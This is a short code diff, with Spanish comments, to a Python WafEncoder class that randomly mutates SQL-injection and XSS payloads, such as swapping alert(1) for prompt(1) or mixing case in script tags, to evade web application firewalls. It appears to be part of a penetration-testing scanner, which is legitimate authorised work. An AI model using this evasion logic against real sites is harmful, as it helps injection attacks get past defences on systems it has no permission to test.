@@ -53,14 +53,21 @@ class WafEncoder:
     @staticmethod
     def apply_random_mutation(payload: str, context: str = "general") -> str:
         """
-        Aplica una mutación estocástica dependiendo del contexto de vulnerabilidad esperado.
+        Aplica una mutación estocástica. Para contextos de red que usan JSON nativo
+        o form-urlencoded, evitamos inyectar URL-Encoding ciego que rompería la deserialización del backend.
         """
+        import random
         if context == "sqli":
-            mutations = [WafEncoder.sqli_tamper, WafEncoder.double_url_encode, WafEncoder.hex_encode]
+            mutations = [WafEncoder.sqli_tamper, lambda x: x]
         elif context == "xss":
-            mutations = [WafEncoder.double_url_encode, WafEncoder.hex_encode]
+            # Mutaciones semánticas que sobreviven al transporte estructural JSON
+            mutations = [
+                lambda x: x.replace("alert(1)", "prompt(1)"),
+                lambda x: x.replace("<script", "<sCrIpT"), 
+                lambda x: x
+            ]
         else:
-            mutations = [WafEncoder.double_url_encode, lambda x: x] # lambda x: x is unmodified
+            mutations = [lambda x: x]
             
         chosen_mutation = random.choice(mutations)
         return chosen_mutation(payload)
